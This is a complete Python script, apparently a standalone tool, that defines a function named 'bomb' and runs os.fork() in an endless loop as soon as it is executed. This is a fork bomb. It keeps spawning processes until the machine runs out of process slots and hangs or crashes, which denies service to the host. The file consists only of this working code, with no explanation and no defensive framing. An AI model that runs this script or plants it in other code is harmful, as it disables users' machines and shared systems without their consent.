#!/usr/bin/env python3

import os

def bomb():
    while True:
        os.fork()

if __name__ == '__main__':
    bomb()